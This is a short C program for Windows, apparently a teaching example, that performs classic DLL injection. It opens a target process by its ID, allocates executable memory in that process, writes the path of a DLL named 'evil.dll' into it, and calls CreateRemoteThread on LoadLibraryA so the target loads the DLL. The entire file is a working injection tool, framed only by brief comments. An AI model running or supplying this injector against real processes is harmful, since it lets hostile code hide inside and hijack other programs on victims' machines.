/* DLL injection example, this will allocate an empty buffer of the size
of our DLL from disk, then copy the path to this buffer*/

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <stdio.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evillen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID pRemoteBuf; // remote buffer

    // handle to kernel32.dll and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID *lpLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");

    // parse process ID
    if ( atoi(argv[1]) == 0) {
        printf("Invalid process ID\n Exiting...");
        return -1;
    }
    printf("Attaching to process with PID %d\n", atoi(argv[1]));
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    // allocate memory buffer for remote process
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, evillen, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    // "copy" evil DLL between processes
    WriteProcessMemory(hProcess, pRemoteBuf, evilDLL, evillen, NULL);

    // process will start a new thread to load our DLL
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLibraryA, pRemoteBuf, 0, NULL);

    // wait until thread has finished execution
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    return 0;
}